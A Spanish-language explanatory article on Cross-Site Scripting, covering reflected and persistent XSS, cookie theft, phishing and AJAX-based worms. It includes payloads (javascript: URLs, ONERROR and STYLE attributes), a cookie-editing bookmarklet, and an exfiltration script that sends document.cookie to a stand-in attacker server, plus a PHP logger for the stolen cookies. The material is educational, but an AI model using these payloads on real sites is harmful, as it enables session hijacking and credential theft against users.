# Cross-Site Scripting (XSS)

El diagrama de secuencia del ataque de secuencias de comandos entre sitios

!https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Cross-site_scripting_attack_sequence_diagram_-_en.png/220px-Cross-site_scripting_attack_sequence_diagram_-_en.png

Una secuencia de comandos en sitios cruzados o Cross-site scripting (XSS por sus siglas en idioma inglés) es un tipo de vulnerabilidad informática o agujero de seguridad típico de las aplicaciones Web, que puede permitir a una tercera persona inyectar en páginas web visitadas por el usuario código JavaScript o en otro lenguaje similar (por ejemplo, VBScript). Se puede evitar usando medidas como CSP, política del mismo origen, etcétera.

Es posible encontrar una vulnerabilidad de Cross-Site Scripting en aplicaciones que tengan entre sus funciones presentar la información en un navegador web u otro contenedor de páginas web. Sin embargo, no se limita a sitios web disponibles en Internet, ya que puede haber aplicaciones locales vulnerables a XSS, o incluso el navegador en sí.

## Mecanismo de Ataque

XSS es un vector de ataque que puede ser utilizado para robar información delicada, secuestrar sesiones de usuario, y comprometer el navegador, subyugando la integridad del sistema. Las vulnerabilidades XSS han existido desde los primeros días de la Web.

Esta situación es habitualmente causada al no validar correctamente los datos de entrada que son usados en cierta aplicación, o no sanear la salida adecuadamente para su presentación como página web.

Esta vulnerabilidad puede estar presente de las siguientes formas:

- **Directa**: (también llamada Persistente): este tipo de XSS comúnmente filtrado, y consiste en insertar código HTML peligroso en sitios que lo permitan; incluyendo así etiquetas como <script> o <iframe>.
- **Indirecta**: (también llamada Reflejada): este tipo de XSS consiste en modificar valores que la aplicación web utiliza para pasar variables entre dos páginas, sin usar sesiones y sucede cuando hay un mensaje o una ruta en la URL del navegador, en una cookie, o cualquier otra cabecera HTTP (en algunos navegadores y aplicaciones web, esto podría extenderse al DOM del navegador).

## XSS Indirecto (Reflejado)

Supongamos que un sitio web tiene la siguiente forma:

`http://www.example.com/home.asp?frame=menu.asp`

y que al acceder se creará un documento HTML enlazando con un frame a menu.asp.

En este ejemplo, ¿qué pasaría si se pone como URL del frame un código javascript?

`javascript:while(1) alert("Este mensaje saldrá indefinidamente");`

Si este enlace lo pone un atacante hacia una víctima, un visitante podrá verlo y verá que es del mismo dominio, suponiendo que no puede ser nada malo y de resultado tendrá un bucle infinito de mensajes.

Un atacante en realidad trataría de colocar un script que robe las cookies de la víctima, para después poder personificarse como con su sesión, o hacer automático el proceso con el uso de la biblioteca cURL o alguna similar. De esta forma, al recibir la cookie, el atacante podría ejecutar acciones con los permisos de la víctima sin siquiera necesitar su contraseña.

Otro uso común para estas vulnerabilidades es lograr hacer phishing. Quiere ello decir que la víctima ve en la barra de direcciones un sitio, pero realmente está en otra. La víctima introduce su contraseña y se la envía al atacante.

Una página como la siguiente:

`error.php?error=Usuario%20Invalido`

es probablemente vulnerable a XSS indirecto, ya que si escribe en el documento "Usuario Inválido", esto significa que un atacante podría insertar HTML y JavaScript si así lo desea.

Por ejemplo, un tag como <script> que ejecute código javascript, cree otra sesión bajo otro usuario y mande la sesión actual al atacante.

Para probar vulnerabilidades de XSS en cookies, se puede modificar el contenido de una cookie de forma sencilla, usando el siguiente script. Solamente se debe colocar en la barra de direcciones, y presionar 'Enter'.

`javascript:void prompt("Introduce la cookie:",document.cookie).replace(/[^;]+/g,function(_){document.cookie=_;});`

## XSS Directo (Persistente)

Funciona localizando puntos débiles en la programación de los filtros de HTML si es que existen, para publicar contenido (como blogs, foros, etc.).

Normalmente el atacante tratará de insertar tags como <iframe>, o <script>, pero en caso de fallar, el atacante puede tratar de poner tags que casi siempre están permitidas y es poco conocida su capacidad de ejecutar código. De esta forma, el atacante podría ejecutar código malicioso.

**Ejemplos**: Una posibilidad es usar atributos que permiten ejecutar código.

`<BR STYLE="behavior: url(<http://yoursite/xss.htc>);"> <DIV STYLE="background-image: url(javascript:alert('XSS'))"> <IMG SRC=X ONERROR="alert(/XSS/)">`

## AJAX

Usar AJAX para ataques de XSS no es tan conocido, pero sí peligroso. Se basa en usar cualquier tipo de vulnerabilidad de XSS para introducir un objeto XMLHttp y usarlo para enviar contenido POST, GET, sin conocimiento del usuario.

Este se ha popularizado con gusanos de XSS que se encargan de replicarse por medio de vulnerabilidades de XSS persistentes (aunque la posibilidad de usar XSS reflejados es posible).

El siguiente script de ejemplo obtiene el valor de las cookies y seguidamente las enviaría al atacante.

**JavaScript**:

```javascript
var cookiesDeUsuario = document.cookie;

var xhr = new XMLHttpRequest(); // Objeto Ajax
xhr.open('GET', 'www.servidor-atacante.com/cookies.php');
xhr.send('c=' + cookiesDeUsuario);
```

**PHP (Servidor del Atacante)**:

```php
<?php

$archivo = fopen('log2.htm','a');

$cookie = $_GET['c'];

$ip = getenv ('REMOTE_ADDR');

$re = $HTTPREFERRER;

$fecha=date("j F, Y, g:i a");

fwrite($archivo, '<br />Cookie: '.htmlentities($cookie).'<br />Página: '.htmlentities($re));
fwrite($archivo, '<br /> IP: ' .$ip. '<br /> Fecha y Hora: ' .$fecha. '</hr>');

fclose($archivo);

?>
```
